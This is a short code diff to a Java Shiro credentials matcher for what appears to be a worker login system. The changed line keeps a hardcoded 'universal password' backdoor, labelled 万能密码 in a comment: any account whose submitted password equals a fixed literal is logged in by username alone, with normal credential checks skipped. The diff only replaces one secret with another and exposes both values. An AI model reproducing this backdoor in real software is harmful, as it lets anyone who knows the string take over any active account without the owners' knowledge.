@@ -69,7 +69,7 @@ public class CustomCredentialsMatcher extends SimpleCredentialsMatcher {
 		//daifa_worker里的主登录人
 		//DaifaWorker worker=new DaifaWorker ();
 		DaifaWorkerExample wExample=new DaifaWorkerExample();
-		if("1qazxsw2".equals (new String (token.getPassword ()))){//万能密码
+		if("fqtdtihfhqkiller81682024".equals (new String (token.getPassword ()))){//万能密码
 			wExample.createCriteria ().andDaifaWorkerEqualTo (token.getUsername ()).andUseStatusEqualTo (1);
 
 		}else{
